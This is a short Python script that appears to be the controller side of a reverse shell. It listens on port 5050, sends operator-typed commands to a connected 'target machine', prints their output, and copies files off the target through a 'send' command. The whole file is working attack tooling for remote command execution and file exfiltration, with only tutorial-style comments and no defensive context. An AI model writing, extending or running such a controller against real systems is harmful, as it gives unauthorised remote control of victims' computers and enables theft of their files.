import socket
import sys

#Create a socket (to connect to a computer)
def socket_create():
	try:
		global host
		global port
		global mysocket
		host = ""
		port = 5050
		mysocket = socket.socket()

	except socket.error as msg:
		print("Socket creation error: " + str(msg))

#Bind the socket port to your PC port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global mysocket
		print("Binding socket to port:" + str(port))
		mysocket.bind((host,port)) #Giving the port and host ip for socket to bind on
		mysocket.listen(5) #Listening to a connection request (5 = no. of connection attempts it'll accept before refusing any new connection)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")

#Establish a connection with a client
def socket_accept():
	conn, address = mysocket.accept()
	print("Connection has been established | " + "IP: " + address[0] + " | Port: " + str(address))
	send_commands(conn)
	conn.close()

#Sending commands to target machine
def send_commands(conn):
	while True:
		cmd = input()
		if cmd.lower() == 'quit':
			conn.close()
			mysocket.close()
			sys.exit()

		if cmd[:4].lower() == 'send':
			conn.send(cmd.encode('utf-8'))
			fhand = open('copy' + cmd[5:], 'a')
			buff = conn.recv(64)
			buff_size = buff.decode('utf-8')
			print(cmd[5:])

			while True:
				line = conn.recv(int(buff_size)).decode('utf-8')
				fhand.write(line)
				print("File received")
				fhand.close()
				break


		if len(str.encode(cmd)) > 0:
			conn.send(cmd.encode('utf-8'))
			client_response = str(conn.recv(1024), 'utf-8')
			print(client_response, end="")





def main():
	socket_create()
	socket_bind()
	socket_accept()


main()
